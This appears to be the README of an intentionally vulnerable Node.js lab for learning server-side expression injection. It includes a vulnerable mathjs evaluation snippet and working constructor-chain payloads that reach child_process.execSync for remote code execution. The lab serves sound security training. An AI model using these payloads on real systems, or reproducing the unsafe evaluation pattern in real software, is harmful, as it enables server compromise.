# 🧠 Server-Side Expression Injection (SSEI) Vulnerable Lab

Welcome to the **SSEI-Lab**, a purposely vulnerable web app built to help security professionals, CTF players, and students learn how Server-Side Expression Injection vulnerabilities work — including how they can lead to Remote Code Execution (RCE).

## 🧠 Purpose

🚀 This repo provides:

- A wordlist of payloads to detect and exploit SSEI.
- A vulnerable Docker lab for hands-on practice.

## What is SSEI?

Server-Side Expression Injection (SSEI) is a vulnerability where user input is interpreted as a code expression on the server side. This often occurs in applications using math evaluators, template engines, or unsafe `eval()` functions.

## Example vulnerable code

```js
const math = require('mathjs');
const userInput = req.body.equation;
const result = math.evaluate(userInput);
res.send("Math result: " + result);
```

## Payload Examples

- `1+1` → 2
- `[].constructor.constructor("return process")()` → access Node.js process object
- `[].constructor.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()` → RCE

## Tools

Use with tools like:

- Burp Suite Intruder
- curl/Postman
- ffuf, wfuzz

## Running the Docker Lab

This Docker-based lab contains a **Node.js web application** that evaluates user-supplied mathematical expressions — similar to many real-world calculators — but with a vulnerability: **user input is evaluated directly**.

### Vulnerability

This lab demonstrates **Server-Side Expression Injection (SSEI)**, which can be exploited to execute arbitrary JavaScript and eventually run **OS-level commands**.

---

## 🧰 Technologies

- Node.js 18
- Express.js
- Minimal frontend (HTML + jQuery)
- Docker

---

## 🐳 How to Use

### Step 1: Build the Docker Image

```bash
git clone https://github.com/D0tP1r4t3/dotpirate-vuln-labs.git
cd ssei-lab
sudo docker build -t ssei-lab .
```
#### On Kali Use the following

```bash
sudo apt update
sudo apt install -y docker.io
sudo systemctl start docker
git clone https://github.com/YOUR_USERNAME/ssei-lab.git
cd ssei-lab
sudo docker build -t ssei-lab .
```

### Step 2: Run the Docker

```bash
sudo docker run -p 3000:3000 ssei-lab
```

Then visit http://localhost:3000

### 🎯 Example Exploit
Once running, enter this payload into the input field:
```js
[]["constructor"]["constructor"]("return process")()
```

Or for command execution:
```js
[]["constructor"]["constructor"]("return global.process.mainModule.require('child_process').execSync('id').toString()")()
```

### 🔐 Disclaimer

This is for educational purposes only. Do NOT deploy this lab on a public server or use it for anything unethical.
